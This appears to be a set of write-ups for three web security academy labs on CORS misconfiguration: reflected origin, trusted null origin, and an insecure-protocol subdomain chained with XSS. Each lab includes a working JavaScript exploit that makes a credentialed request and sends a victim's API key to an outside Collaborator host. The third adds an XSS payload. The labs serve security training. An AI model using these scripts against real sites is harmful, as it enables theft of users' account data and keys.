# Lab: CORS vulnerability with basic origin reflection


### Step 1: Log in and observe normal behaviour

Log in with wiener:peter. Capture the request to /accountDetails.

```burp
GET /accountDetails HTTP/2
Host: 0a920072043b2f06800cd6c900df0072.web-security-academy.net
Cookie: session=FTsYEKm2zZ9t0uAiyXaPTeeEQe88mxum
User-Agent: Mozilla/5.0 ...
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a920072043b2f06800cd6c900df0072.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
```

Response :

```burp
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "bqHYfkL3I5eFlXlPcFVw6WciQ1BZjyLI",
  "sessions": ["FTsYEKm2zZ9t0uAiyXaPTeeEQe88mxum"]
}
```

Here, Access-Control-Allow-Credentials is set to true. So the browser will include cookies and authentication headers in the cross-origin request, making the victim’s session vulnerable to data exfiltration.

### Step 2: Test for CORS misconfiguration

Add an arbitrary Origin header, e.g., Origin: google.com.

Modified request:

```burp
GET /accountDetails HTTP/2
Host: 0a920072043b2f06800cd6c900df0072.web-security-academy.net
Cookie: session=FTsYEKm2zZ9t0uAiyXaPTeeEQe88mxum
Origin: google.com
... (other headers same)
```

Vulnerable response (origin reflected):

```burp
HTTP/2 200 OK
Access-Control-Allow-Origin: google.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "apikey": "bqHYfkL3I5eFlXlPcFVw6WciQ1BZjyLI",
  ...
}
```

The server echoes any Origin and allows credentials → vulnerable.

### Step 3: Prepare exploit with Burp Collaborator

Open Burp Collaborator client (Burp menu → Burp Collaborator client). Click “Copy to clipboard” to get a unique URL, e.g., `https://mj95mdkxlvxoea49mqm5lfhc53buzqnf.oastify.com`.

Craft the exploit. It will send an authenticated XMLHttpRequest to /accountDetails from the victim’s browser and forward the API key to the Collaborator URL.

```js
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        if (req.status == 200) {
            var data = JSON.parse(req.responseText);
            var apikey = data.apikey;
            new Image().src = 'https://mj95mdkxlvxoea49mqm5lfhc53buzqnf.oastify.com/?apikey=' + encodeURIComponent(apikey);
        }
    };
    req.open('GET', 'https://0a920072043b2f06800cd6c900df0072.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();
</script>
</body>
</html>
```

### Step 4: Host and deliver the exploit

In the lab, click “Go to exploit server”. Paste the HTML into the “Body” section. Click “Store”. Then click “Deliver exploit to victim”. The victim (administrator) will load the exploit page and execute the malicious script.

### Step 5: Capture the stolen API key

Poll the Burp Collaborator client (“Poll now”). You will see DNS interactions and an HTTP interaction. The HTTP request contains the exfiltrated API key.
Captured HTTP request in Collaborator:

```
GET /?apikey=KB3DvjRErYpawXJe96ADCGnbu5Og4hlw HTTP/1.1
Host: mj95mdkxlvxoea49mqm5lfhc53buzqnf.oastify.com
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 ...
sec-ch-ua-platform: "Linux"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://exploit-...exploit-server.net/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
```

The parameter apikey holds the administrator’s API key: KB3DvjRErYpawXJe96ADCGnbu5Og4hlw. Submit the solution.



# Lab: CORS vulnerability with trusted null origin


### Step 1: Log in to the lab

Use the credentials wiener:peter to log in. This confirms the lab is accessible and the accountDetails endpoint works.

### Step 2: Generate a Burp Collaborator URL

Open Burp Collaborator client (Burp menu → Burp Collaborator client). Click “Copy to clipboard” to get a unique URL, for example:
https://mlbdcw2yowq7926wggg10ps86zcq0ood.oastify.com

This URL will receive the exfiltrated API key.

### Step 3: Prepare the iframe exploit

The following HTML uses a sandboxed iframe to force the browser to send `Origin: null`. The server trusts the null origin and allows credentials.

```html
<iframe sandbox="allow-scripts allow-forms"
        src="data:text/html,
<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    if (req.status == 200) {
      var data = JSON.parse(req.responseText);
      var apikey = data.apikey;
      new Image().src = 'https://mlbdcw2yowq7926wggg10ps86zcq0ood.oastify.com/?apikey=' + encodeURIComponent(apikey);
    }
  };
  req.open('GET', 'https://0a47002903779f9180c72b24007a006d.web-security-academy.net/accountDetails', true);
  req.withCredentials = true;
  req.send();
</script>">
</iframe>
```

### Step 4: Host the exploit &  Deliver the exploit to the victim

In the lab, click “Go to exploit server”. Paste the entire iframe code into the “Body” section. Click “Store”.
Click “Deliver exploit to victim”. The victim (administrator) will load the exploit page. The sandboxed iframe sends a cross‑origin request to /accountDetails with Origin: null. The server reflects the null origin and sets Access-Control-Allow-Credentials: true. The browser allows the script to read the response.

Return to Burp Collaborator client. Click “Poll now”. You will see an HTTP interaction containing the exfiltrated data. Look for a GET request like:

```
GET /?apikey=Ze9k8vWLSpWSHFFk210mj4sjFtGTrSJj HTTP/1.1
Host: mlbdcw2yowq7926wggg10ps86zcq0ood.oastify.com
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
sec-ch-ua-platform: "Linux"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
```
The parameter apikey holds the administrator’s API key: Ze9k8vWLSpWSHFFk210mj4sjFtGTrSJj. Submit the solution.



# Lab: CORS vulnerability with trusted insecure protocols

### Step 1: Log in and identify the CORS endpoint

Log in with wiener:peter. Open Burp history and locate the AJAX request to /accountDetails. The response contains Access-Control-Allow-Credentials: true, indicating CORS support.

Send this request to Repeater. Add an Origin header: Origin: `http://stock.0a83005003af9c8780ba132500f70048.web-security-academy.net`. Observe that the response includes Access-Control-Allow-Origin: `http://stock.0a83005003af9c8780ba132500f70048.web-security-academy.net` – the origin is reflected, confirming that any subdomain (HTTP or HTTPS) is trusted.

### Step 2: Find an XSS on a subdomain

Open any product page (e.g., /product?productId=1). Click “Check stock”. Notice that the stock check uses an HTTP URL on a subdomain: http://stock.0a83005003af9c8780ba132500f70048.web-security-academy.net/?productId=...&storeId=1.

Test the productId parameter for XSS. It is vulnerable. For example, adding <script>alert(1)</script> executes.

### Step 3: Craft the combined exploit

Generate a Burp Collaborator URL (e.g., https://6elx5gvihgjr2mzg909lt9lszj5atahz.oastify.com). The exploit will:

- Redirect the victim to the HTTP stock subdomain with an XSS payload.
- The XSS payload makes an authenticated CORS request to /accountDetails.
- The stolen API key is sent to the Collaborator.

The full exploit payload (to be placed on the exploit server):

```js
<script>
document.location="http://stock.0a83005003af9c8780ba132500f70048.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a83005003af9c8780ba132500f70048.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://6elx5gvihgjr2mzg909lt9lszj5atahz.oastify.com/log?key='+this.responseText; };</script>&storeId=1"
</script>
```

Note: The inner <script> tag is URL‑encoded as %3cscript%3e etc. In the actual payload, use proper encoding. The above is a readable representation.

### Step 4: Host and deliver the exploit

Go to the lab’s exploit server. Paste the exploit code into the “Body” section. Click “Store”. Then click “Deliver exploit to victim”.

### Step 5: Capture the API key

Open Burp Collaborator client and click “Poll now”. You will see an HTTP request containing the administrator’s API key in the key parameter. Submit the solution

Scroll down on the lab page, paste the API key into the “Submit solution” field, and click “Submit”. The lab is solved.
